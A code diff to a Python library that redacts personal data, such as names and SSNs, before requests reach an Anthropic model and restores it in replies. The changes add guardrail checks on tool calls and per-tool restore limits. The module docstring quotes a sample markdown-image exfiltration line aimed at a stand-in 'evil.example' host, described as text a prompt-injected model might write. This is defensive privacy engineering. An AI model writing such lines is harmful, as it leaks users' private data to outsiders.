@@ -13,7 +13,9 @@ Each request goes out as a copy with placeholders in place of the real values
 (what the user typed, tool results, the system prompt and the model's earlier
 turns), and the reply's text and tool-call inputs come back with the real
 values.  Use one redactor per conversation.  Thinking blocks go back exactly
-as they came.
+as they came.  The tools' descriptions and ``metadata`` are redacted too.  A
+content block veil doesn't know raises ``BlockError`` rather than being sent
+as it is.
 
 A request with an image, a PDF or a Word document in it is refused
 (``FileError``) unless you say otherwise: ``files="read"`` reads their text on
@@ -26,9 +28,22 @@ With a ``guardrail`` (any object with a ``check(texts, source) -> Findings``
 method, raising GuardrailError when it can't check), each new text in a
 request is checked first: what it finds becomes a placeholder too, and
 anything else it objects to stops the request.  In a reply, a taxpayer ID it
-finds is taken out, and a reply it objects to is replaced with a note.
+finds is taken out, and a reply it objects to is replaced with a note.  Each
+tool call's input is checked too: a taxpayer ID in one is taken out, and a
+call it objects to, or can't check, raises GuardrailError, so no tool runs on
+it.
 
-Streaming isn't supported yet: ``stream=True`` raises.
+A placeholder in a reply's text or a tool call comes back as its real value,
+except inside a URL or a link's target, where it stays a placeholder: text
+the model was tricked into writing ("![](https://evil.example/?d=SSN_001)")
+can't carry a real value off when it's shown or fetched (``restore_urls=True``
+lets it).  ``restore`` says which kinds each tool gets back, so a tool that
+sends things out can be kept to placeholders:
+``restore={"add_member": {"NAME", "SSN"}, "*": set()}``.
+
+Streaming isn't supported yet: ``stream=True`` raises, and so do
+``messages.stream``, ``parse``, ``batches``, ``tool_runner`` and the raw
+response forms, which would otherwise send the request without placeholders.
 """
 
 from __future__ import annotations
@@ -37,7 +52,7 @@ import base64
 import copy
 import hashlib
 from dataclasses import dataclass, field
-from typing import Any, Callable
+from typing import Any, Callable, Collection, Mapping
 
 from veil.redactor import Redactor
 from veil.tax_ids import TAX_ID_KINDS
@@ -56,6 +71,18 @@ class GuardrailError(Exception):
 class FileError(Exception):
     """An image or PDF in a request couldn't be sent without what's in it, so nothing was sent.  The message is
     for the user."""
+
+
+class BlockError(Exception):
+    """A content block of a kind veil doesn't know how to redact, so nothing was sent.  The message is for the
+    user."""
+
+
+# Blocks the model or Anthropic's own tools wrote, which hold only placeholders already: sent back as they are.
+_AS_THEY_ARE = {"thinking", "redacted_thinking", "web_search_tool_result", "web_fetch_tool_result",
+                "code_execution_tool_result", "bash_code_execution_tool_result",
+                "text_editor_code_execution_tool_result", "tool_search_tool_result", "mcp_tool_use",
+                "mcp_tool_result", "tool_reference"}
 
 
 @dataclass
@@ -82,8 +109,13 @@ class Session:
     """One conversation's redactor and guardrail, and the request and reply handling ``wrap`` uses."""
 
     def __init__(self, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
-                 files: str | Callable[[bytes, str], str] = "refuse"):
+                 files: str | Callable[[bytes, str], str] = "refuse",
+                 restore: Mapping[str, Collection[str] | str | None] | None = None, restore_urls: bool = False):
         self.redactor = redactor if redactor is not None else Redactor()
+        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.
+        self.restore = {name: {kinds} if isinstance(kinds, str) else None if kinds is None else set(kinds)
+                        for name, kinds in (restore or {}).items()}
+        self.restore_urls = restore_urls
         self.guardrail = guardrail
         self.redact_system = redact_system
         if files == "read":
@@ -112,7 +144,22 @@ class Session:
                 out["system"] = self.redactor.redact_text(system)
             elif isinstance(system, list):
                 out["system"] = [self._block(b, "system") for b in system]
+        if self.redact_system and isinstance(request.get("tools"), list):
+            out["tools"] = [self._tool(t) for t in request["tools"]]
+        if isinstance(request.get("metadata"), dict):
+            out["metadata"] = self.redactor.redact(request["metadata"])
         return out
+
+    def _tool(self, tool: Any) -> Any:
+        """A tool with its description, and each description in its input schema, redacted."""
+        def walk(value: Any) -> Any:
+            if isinstance(value, dict):
+                return {k: self.redactor.redact_text(v) if k == "description" and isinstance(v, str) else walk(v)
+                        for k, v in value.items()}
+            if isinstance(value, list):
+                return [walk(v) for v in value]
+            return value
+        return walk(_as_dict(tool))
 
     def _message(self, message: dict) -> dict:
         role = message.get("role")
@@ -124,7 +171,7 @@ class Session:
     def _block(self, block: Any, role: str | None) -> Any:
         b = _as_dict(block)
         if not isinstance(b, dict):
-            return block
+            raise BlockError(f"veil can't redact a content block given as {type(block).__name__}. Nothing was sent.")
         kind = b.get("type")
         r = self.redactor
         if kind == "text":
@@ -150,7 +197,13 @@ class Session:
             return self._file(b, role)
         if kind == "image":
             return self._file(b, role)
-        return b   # thinking and the like: as they are
+        if kind == "search_result":   # its content first, so a name it gives is hidden in the title too
+            b = {**b, "content": [self._block(c, None) for c in b.get("content") or []]}
+            return {**b, **{k: r.redact_text(b[k]) for k in ("source", "title") if isinstance(b.get(k), str)}}
+        if kind in _AS_THEY_ARE:
+            return b
+        raise BlockError(f"veil doesn't know how to redact a {kind!r} block, so it would have reached the model "
+                         "as it is. Nothing was sent.")
 
     def _file(self, b: dict, role: str | None) -> dict:
         """An image or PDF block, as ``files`` says: as it is, or its text redacted in its place."""
@@ -214,6 +267,19 @@ class Session:
         walk(request.get("messages"))
         if self.redact_system:
             walk(request.get("system"))
+
+            def descriptions(value: Any) -> None:
+                if isinstance(value, dict):
+                    for key, v in value.items():
+                        if key == "description" and isinstance(v, str):
+                            texts.append(v)
+                        else:
+                            descriptions(v)
+                elif isinstance(value, list):
+                    for v in value:
+                        descriptions(v)
+            descriptions(request.get("tools"))
+        walk(request.get("metadata"))
         return [t for t in texts if t.strip()]
 
     def _guard(self, original: dict, redacted: dict) -> dict:
@@ -250,13 +316,17 @@ class Session:
         response = response.model_copy(deep=True) if hasattr(response, "model_copy") else copy.deepcopy(response)
         content = response["content"] if isinstance(response, dict) else response.content
         if self.guardrail is not None:
+            self._guard_calls(content)
             self._guard_reply(content)
         for i, block in enumerate(content):
             kind = block.get("type") if isinstance(block, dict) else getattr(block, "type", None)
             if kind == "text":
-                self._set(content, i, block, "text", self.redactor.restore_text(self._get(block, "text")))
+                self._set(content, i, block, "text",
+                          self.redactor.restore_text(self._get(block, "text"), urls=self.restore_urls))
             elif kind == "tool_use":
-                self._set(content, i, block, "input", self.redactor.restore(self._get(block, "input")))
+                kinds = self.restore.get(self._get(block, "name"), self.restore.get("*"))
+                self._set(content, i, block, "input",
+                          self.redactor.restore(self._get(block, "input"), kinds, urls=self.restore_urls))
         return response
 
     def _guard_reply(self, content: list) -> None:
@@ -282,6 +352,33 @@ class Session:
                 for i in indices:
                     self._set(content, i, content[i], "text", self._get(content[i], "text").replace(match, TAX_ID_REMOVED))
 
+    def _guard_calls(self, content: list) -> None:
+        """Have the guardrail check each tool call's input before it's put back.  A call it objects to, or can't
+        check, raises GuardrailError, so no tool runs on it; a taxpayer ID in one is taken out."""
+        indices = [i for i, b in enumerate(content) if self._get(b, "type") == "tool_use"]
+        texts: list[str] = []
+        for i in indices:
+            _strings(self._get(content[i], "input"), lambda t: texts.append(t) or t)
+        texts = [t for t in texts if t.strip()]
+        if not texts:
+            return
+        try:
+            found = self.guardrail.check(texts, "OUTPUT")
+        except GuardrailError as exc:
+            raise GuardrailError(f"The guardrail couldn't check this reply's tool calls, so none should run. {exc}") \
+                from exc
+        if found.other:
+            raise GuardrailError("The guardrail held back this reply's tool calls: it flagged "
+                                 f"{', '.join(dict.fromkeys(found.other))}.")
+        if not found.hidden:   # sent back next time as they are: no need to check them again
+            self._checked.update(self._digest(t) for t in texts)
+        for kind, match in found.hidden:
+            self.redactor.add(match, kind)   # so it's a placeholder in every later request
+            if kind in TAX_ID_KINDS:
+                for i in indices:
+                    self._set(content, i, content[i], "input", _strings(
+                        self._get(content[i], "input"), lambda t, m=match: t.replace(m, TAX_ID_REMOVED)))
+
     @staticmethod
     def _get(block: Any, key: str) -> Any:
         return block.get(key) if isinstance(block, dict) else getattr(block, key, None)
@@ -294,7 +391,26 @@ class Session:
             setattr(block, key, value)
 
 
+def _strings(value: Any, fix: Callable[[str], str]) -> Any:
+    """``value`` with ``fix`` applied to each string in it (not dict keys); dicts and lists are walked."""
+    if isinstance(value, str):
+        return fix(value)
+    if isinstance(value, dict):
+        return {k: _strings(v, fix) for k, v in value.items()}
+    if isinstance(value, (list, tuple)):
+        return [_strings(v, fix) for v in value]
+    return value
+
+
+def _unwrapped(name: str, where: str = "messages.") -> NotImplementedError:
+    return NotImplementedError(f"veil doesn't redact {where}{name} yet, so it would send the request without "
+                               "placeholders; call messages.create instead.")
+
+
 class _Messages:
+    """``create`` and ``count_tokens`` through placeholders.  Everything else the SDK's messages have would send
+    the request as it is, so it raises."""
+
     def __init__(self, messages, session: Session):
         self._messages = messages
         self._session = session
@@ -308,8 +424,30 @@ class _Messages:
     def count_tokens(self, **request):
         return self._messages.count_tokens(**self._session.redact_request(request))
 
+    def stream(self, *args, **kwargs):
+        raise _unwrapped("stream")
+
+    def parse(self, *args, **kwargs):
+        raise _unwrapped("parse")
+
+    def tool_runner(self, *args, **kwargs):
+        raise _unwrapped("tool_runner")
+
+    @property
+    def batches(self):
+        raise _unwrapped("batches")
+
+    @property
+    def with_raw_response(self):
+        raise _unwrapped("with_raw_response")
+
+    @property
+    def with_streaming_response(self):
+        raise _unwrapped("with_streaming_response")
+
     def __getattr__(self, name):
-        return getattr(self._messages, name)
+        raise AttributeError(f"veil doesn't wrap messages.{name}, so it isn't offered: it would send the request "
+                             "without placeholders.")
 
 
 class _Beta:
@@ -317,12 +455,22 @@ class _Beta:
         self._beta = beta
         self.messages = _Messages(beta.messages, session)
 
+    @property
+    def with_raw_response(self):
+        raise _unwrapped("with_raw_response", "beta.")
+
+    @property
+    def with_streaming_response(self):
+        raise _unwrapped("with_streaming_response", "beta.")
+
     def __getattr__(self, name):
         return getattr(self._beta, name)
 
 
 class VeiledClient:
-    """An Anthropic client whose ``messages.create`` (and ``beta.messages.create``) go through placeholders."""
+    """An Anthropic client whose ``messages.create`` (and ``beta.messages.create``) go through placeholders.
+    ``with_options`` and ``copy`` give another one, with the same conversation; the legacy ``completions`` and
+    the raw response forms, which would send the request without placeholders, raise."""
 
     def __init__(self, client, session: Session):
         self._client = client
@@ -335,15 +483,40 @@ class VeiledClient:
     def redactor(self) -> Redactor:
         return self.session.redactor
 
+    def with_options(self, *args, **kwargs) -> VeiledClient:
+        return VeiledClient(self._client.with_options(*args, **kwargs), self.session)
+
+    def copy(self, *args, **kwargs) -> VeiledClient:
+        return VeiledClient(self._client.copy(*args, **kwargs), self.session)
+
+    @property
+    def completions(self):
+        raise NotImplementedError("veil doesn't redact the legacy Text Completions API (completions), so it would "
+                                  "send the prompt without placeholders; call messages.create instead.")
+
+    @property
+    def with_raw_response(self):
+        raise _unwrapped("with_raw_response", "")
+
+    @property
+    def with_streaming_response(self):
+        raise _unwrapped("with_streaming_response", "")
+
     def __getattr__(self, name):
         return getattr(self._client, name)
 
 
 def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
-         files: str | Callable[[bytes, str], str] = "refuse") -> VeiledClient:
+         files: str | Callable[[bytes, str], str] = "refuse",
+         restore: Mapping[str, Collection[str] | str | None] | None = None,
+         restore_urls: bool = False) -> VeiledClient:
     """``client`` (anthropic.Anthropic, AnthropicBedrock ...) with placeholders on the way out and real values
     on the way back.  Use one per conversation, or pass the conversation's ``redactor``.
 
     ``files`` says what happens to images and PDFs: "refuse" the request (the default), "read" their text
-    here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them."""
-    return VeiledClient(client, Session(redactor, guardrail, redact_system, files))
+    here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them.
+
+    ``restore`` says which placeholder kinds each tool's calls get back as real values, by tool name, with
+    ``"*"`` for any tool not named (``{"add_member": {"NAME", "SSN"}, "*": set()}``); a tool it doesn't cover
+    gets every kind.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders)."""
+    return VeiledClient(client, Session(redactor, guardrail, redact_system, files, restore, restore_urls))
